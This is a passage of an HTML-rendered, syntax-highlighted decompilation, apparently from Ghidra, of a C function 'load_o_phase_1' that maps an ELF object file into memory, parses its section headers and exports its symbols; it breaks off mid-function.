</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">111
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">112
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">113
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">114
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">115
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">116
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">117
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">118
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">119
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">120
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">121
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">122
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">123
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">124
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">125
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">load_o_phase_1</span>(<span style="color:#078;font-weight:bold">int</span> <span style="color:#555">*</span>o_ctx,undefined8 param_2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ushort uVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> iVar2;
</span></span><span style="display:flex;"><span>  undefined8 uVar3;
</span></span><span style="display:flex;"><span>  undefined local_f8 [<span style="color:#f60">48</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_c8;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_68;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_60;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_58;
</span></span><span style="display:flex;"><span>  uint <span style="color:#555">*</span>local_50;
</span></span><span style="display:flex;"><span>  ulong local_48;
</span></span><span style="display:flex;"><span>  ulong local_40;
</span></span><span style="display:flex;"><span>  undefined <span style="color:#555">*</span>local_38;
</span></span><span style="display:flex;"><span>  undefined <span style="color:#555">*</span>local_30;
</span></span><span style="display:flex;"><span>  ushort local_22;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_20;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  iVar2 <span style="color:#555">=</span> sys_open(param_2,<span style="color:#f60">0</span>,<span style="color:#f60">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#555">*</span>o_ctx <span style="color:#555">=</span> iVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>o_ctx <span style="color:#555">&lt;</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>    die(<span style="color:#c30">&#34;could not open file&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  sys_fstat(<span style="color:#555">*</span>o_ctx,local_f8);
</span></span><span style="display:flex;"><span>  <span style="color:#555">*</span>(ulong <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">6</span>) <span style="color:#555">=</span> local_c8 <span style="color:#555">+</span> <span style="color:#f60">0xfffU</span> <span style="color:#555">&amp;</span> <span style="color:#f60">0xfffffffffffff000</span>;
</span></span><span style="display:flex;"><span>  uVar3 <span style="color:#555">=</span> sys_mmap(<span style="color:#f60">0</span>,<span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">6</span>),<span style="color:#f60">1</span>,<span style="color:#f60">2</span>,(<span style="color:#078;font-weight:bold">long</span>)<span style="color:#555">*</span>o_ctx,<span style="color:#f60">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">2</span>) <span style="color:#555">=</span> uVar3;
</span></span><span style="display:flex;"><span>  <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">4</span>) <span style="color:#555">=</span> <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">2</span>);
</span></span><span style="display:flex;"><span>  uVar3 <span style="color:#555">=</span> aslr_get_addr(<span style="color:#555">*</span>(ushort <span style="color:#555">*</span>)(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">4</span>) <span style="color:#555">+</span> <span style="color:#f60">0x3c</span>) <span style="color:#555">+</span> <span style="color:#f60">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">0x14</span>) <span style="color:#555">=</span> uVar3;
</span></span><span style="display:flex;"><span>  local_20 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">0x14</span>);
</span></span><span style="display:flex;"><span>  uVar3 <span style="color:#555">=</span> mmap_or_die(local_20,<span style="color:#f60">0x1000</span>,<span style="color:#f60">3</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">0x16</span>) <span style="color:#555">=</span> uVar3;
</span></span><span style="display:flex;"><span>  <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">0x18</span>) <span style="color:#555">=</span> <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">0x16</span>);
</span></span><span style="display:flex;"><span>  local_20 <span style="color:#555">=</span> local_20 <span style="color:#555">+</span> <span style="color:#f60">0x1000</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">8</span>) <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">2</span>) <span style="color:#555">+</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">4</span>) <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">10</span>) <span style="color:#555">=</span>
</span></span><span style="display:flex;"><span>       <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">2</span>) <span style="color:#555">+</span>
</span></span><span style="display:flex;"><span>       <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)((ulong)<span style="color:#555">*</span>(ushort <span style="color:#555">*</span>)(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">4</span>) <span style="color:#555">+</span> <span style="color:#f60">0x3e</span>) <span style="color:#555">*</span> <span style="color:#f60">0x40</span> <span style="color:#555">+</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">8</span>) <span style="color:#555">+</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f60">0x18</span>);
</span></span><span style="display:flex;"><span>  local_22 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">do</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(ushort <span style="color:#555">*</span>)(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">4</span>) <span style="color:#555">+</span> <span style="color:#f60">0x3c</span>) <span style="color:#555">&lt;=</span> local_22) {
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">0xe</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>        puts(<span style="color:#c30">&#34;.symtab section not found - that</span><span style="color:#c30;font-weight:bold">\&#39;</span><span style="color:#c30">s somewhat unlikely&#34;</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">0xc</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>        puts(<span style="color:#c30">&#34;.strtab section not found - that</span><span style="color:#c30;font-weight:bold">\&#39;</span><span style="color:#c30">s somewhat unlikely&#34;</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">for</span> (local_48 <span style="color:#555">=</span> <span style="color:#555">*</span>(ulong <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">0x10</span>); local_48 <span style="color:#555">&lt;</span> <span style="color:#555">*</span>(ulong <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">0x12</span>) <span style="color:#555">/</span> <span style="color:#f60">0x18</span>;
</span></span><span style="display:flex;"><span>          local_48 <span style="color:#555">=</span> local_48 <span style="color:#555">+</span> <span style="color:#f60">1</span>) {
</span></span><span style="display:flex;"><span>        local_50 <span style="color:#555">=</span> (uint <span style="color:#555">*</span>)(local_48 <span style="color:#555">*</span> <span style="color:#f60">0x18</span> <span style="color:#555">+</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">0xe</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> ((<span style="color:#555">*</span>(byte <span style="color:#555">*</span>)(local_50 <span style="color:#555">+</span> <span style="color:#f60">1</span>) <span style="color:#555">&gt;&gt;</span> <span style="color:#f60">4</span> <span style="color:#555">!=</span> <span style="color:#f60">0</span>) <span style="color:#555">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>           (((<span style="color:#555">*</span>(byte <span style="color:#555">*</span>)(local_50 <span style="color:#555">+</span> <span style="color:#f60">1</span>) <span style="color:#555">&amp;</span> <span style="color:#f60">0xf</span>) <span style="color:#555">==</span> <span style="color:#f60">1</span> <span style="color:#555">||</span> ((<span style="color:#555">*</span>(byte <span style="color:#555">*</span>)(local_50 <span style="color:#555">+</span> <span style="color:#f60">1</span>) <span style="color:#555">&amp;</span> <span style="color:#f60">0xf</span>) <span style="color:#555">==</span> <span style="color:#f60">2</span>)))) {
</span></span><span style="display:flex;"><span>          local_58 <span style="color:#555">=</span> (ulong)<span style="color:#555">*</span>local_50 <span style="color:#555">+</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">0xc</span>);
</span></span><span style="display:flex;"><span>          local_60 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> ((<span style="color:#078;font-weight:bold">long</span>)(<span style="color:#078;font-weight:bold">int</span>)(uint)<span style="color:#555">*</span>(ushort <span style="color:#555">*</span>)((<span style="color:#078;font-weight:bold">long</span>)local_50 <span style="color:#555">+</span> <span style="color:#f60">6</span>) <span style="color:#555">+</span> <span style="color:#f60">0xc</span>) <span style="color:#555">*</span> <span style="color:#f60">2</span>
</span></span><span style="display:flex;"><span>                                       <span style="color:#555">+</span> <span style="color:#f60">2</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#069;font-weight:bold">if</span> (local_60 <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>            die(<span style="color:#c30">&#34;symbol refers to section that is not loaded&#34;</span>);
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          export_add(local_58,local_60 <span style="color:#555">+</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(local_50 <span style="color:#555">+</span> <span style="color:#f60">2</span>));
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    local_68 <span style="color:#555">=</span> (ulong)local_22 <span style="color:#555">*</span> <span style="color:#f60">0x40</span> <span style="color:#555">+</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">8</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">switch</span>(<span style="color:#555">*</span>(undefined4 <span style="color:#555">*</span>)(local_68 <span style="color:#555">+</span> <span style="color:#f60">4</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">0</span><span style="color:#555">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">4</span><span style="color:#555">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">goto</span> LAB_00401af9;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">1</span><span style="color:#555">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">7</span><span style="color:#555">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">8</span><span style="color:#555">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">2</span><span style="color:#555">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">0xe</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">0xe</span>) <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">2</span>) <span style="color:#555">+</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(local_68 <span style="color:#555">+</span> <span style="color:#f60">0x18</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">0x12</span>) <span style="color:#555">=</span> <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(local_68 <span style="color:#555">+</span> <span style="color:#f60">0x20</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(ulong <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">0x10</span>) <span style="color:#555">=</span> (ulong)<span style="color:#555">*</span>(uint <span style="color:#555">*</span>)(local_68 <span style="color:#555">+</span> <span style="color:#f60">0x2c</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>        die(<span style="color:#c30">&#34;duplicate symtabs&#34;</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">case</span> <span style="color:#f60">3</span><span style="color:#555">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (local_22 <span style="color:#555">!=</span> <span style="color:#555">*</span>(ushort <span style="color:#555">*</span>)(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">4</span>) <span style="color:#555">+</span> <span style="color:#f60">0x3e</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">0xc</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">0xc</span>) <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">2</span>) <span style="color:#555">+</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(local_68 <span style="color:#555">+</span> <span style="color:#f60">0x18</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">else</span> {
</span></span><span style="display:flex;"><span>          die(<span style="color:#c30">&#34;duplicate strtabs&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">default</span><span style="color:#555">:</span>
</span></span><span style="display:flex;"><span>      die(<span style="color:#c30">&#34;unknown section type&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> ((<span style="color:#555">*</span>(ulong <span style="color:#555">*</span>)(local_68 <span style="color:#555">+</span> <span style="color:#f60">8</span>) <span style="color:#555">&amp;</span> <span style="color:#f60">2</span>) <span style="color:#555">!=</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> ((<span style="color:#555">*</span>(ulong <span style="color:#555">*</span>)(local_68 <span style="color:#555">+</span> <span style="color:#f60">8</span>) <span style="color:#555">&amp;</span> <span style="color:#f60">0xf0000000</span>) <span style="color:#555">!=</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>        die(<span style="color:#c30">&#34;SHF_MASKPROC&#34;</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      uVar1 <span style="color:#555">=</span> local_22;
</span></span><span style="display:flex;"><span>      <span style="color:#555">*</span>(ulong <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> ((<span style="color:#078;font-weight:bold">long</span>)(<span style="color:#078;font-weight:bold">int</span>)(uint)local_22 <span style="color:#555">+</span> <span style="color:#f60">0x2c</span>) <span style="color:#555">*</span> <span style="color:#f60">2</span> <span style="color:#555">+</span> <span style="color:#f60">2</span>) <span style="color:#555">=</span>
</span></span><span style="display:flex;"><span>           <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(local_68 <span style="color:#555">+</span> <span style="color:#f60">0x20</span>) <span style="color:#555">+</span> <span style="color:#f60">0xfffU</span> <span style="color:#555">&amp;</span> <span style="color:#f60">0xfffffffffffff000</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> ((<span style="color:#078;font-weight:bold">long</span>)(<span style="color:#078;font-weight:bold">int</span>)(uint)local_22 <span style="color:#555">+</span> <span style="color:#f60">0x2c</span>) <span style="color:#555">*</span> <span style="color:#f60">2</span> <span style="color:#555">+</span> <span style="color:#f60">2</span>) <span style="color:#555">!=</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>        uVar3 <span style="color:#555">=</span> mmap_or_die(local_20,<span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)
</span></span><span style="display:flex;"><span>                                      (o_ctx <span style="color:#555">+</span> ((<span style="color:#078;font-weight:bold">long</span>)(<span style="color:#078;font-weight:bold">int</span>)(uint)local_22 <span style="color:#555">+</span> <span style="color:#f60">0x2c</span>) <span style="color:#555">*</span> <span style="color:#f60">2</span> <span style="color:#555">+</span> <span style="color:#f60">2</span>),<span style="color:#f60">3</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> ((<span style="color:#078;font-weight:bold">long</span>)(<span style="color:#078;font-weight:bold">int</span>)(uint)uVar1 <span style="color:#555">+</span> <span style="color:#f60">0xc</span>) <span style="color:#555">*</span> <span style="color:#f60">2</span> <span style="color:#555">+</span> <span style="color:#f60">2</span>) <span style="color:#555">=</span> uVar3;
</span></span><span style="display:flex;"><span>        local_20 <span style="color:#555">=</span> local_20 <span style="color:#555">+</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> ((<span style="color:#078;font-weight:bold">long</span>)(<span style="color:#078;font-weight:bold">int</span>)(uint)local_22 <span style="color:#555">+</span> <span style="color:#f60">0x2c</span>) <span style="color:#555">*</span> <span style="color:#f60">2</span> <span style="color:#555">+</span> <span style="color:#f60">2</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">int</span> <span style="color:#555">*</span>)(local_68 <span style="color:#555">+</span> <span style="color:#f60">4</span>) <span style="color:#555">!=</span> <span style="color:#f60">8</span>) {
</span></span><span style="display:flex;"><span>          local_38 <span style="color:#555">=</span> <span style="color:#555">*</span>(undefined <span style="color:#555">**</span>)(o_ctx <span style="color:#555">+</span> ((<span style="color:#078;font-weight:bold">long</span>)(<span style="color:#078;font-weight:bold">int</span>)(uint)local_22 <span style="color:#555">+</span> <span style="color:#f60">0xc</span>) <span style="color:#555">*</span> <span style="color:#f60">2</span> <span style="color:#555">+</span> <span style="color:#f60">2</span>);
</span></span><span style="display:flex;"><span>          local_30 <span style="color:#555">=</span> (undefined <span style="color:#555">*</span>)(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(local_68 <span style="color:#555">+</span> <span style="color:#f60">0x18</span>) <span style="color:#555">+</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(o_ctx <span style="color:#555">+</span> <span style="color:#f60">2</span>));
</span></span><span style="display:flex;"><span>          <span style="color:#069;font-weight:bold">for</span> (local_40 <span style="color:#555">=</span> <span style="color:#f60">0</span>; local_40 <span style="color:#555">&lt;</span> <span style="color:#555">*</span>(ulong <span style="color:#555">*</span>)(local_68 <span style="color:#555">+</span> <span style="color:#f60">0x20</span>); local_40 <span style="color:#555">=</span> local_40 <span style="color:#555">+</span> <span style="color:#f60">1</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#555">*</span>local_38 <span style="color:#555">=</span> <span style="color:#555">*</span>local_30;
</span></span><span style="display:flex;"><span>            local_38 <span style="color:#555">=</span> local_38 <span style="color:#555">+</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>            local_30 <span style="color:#555">=</span> local_30 <span style="color:#555">+</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
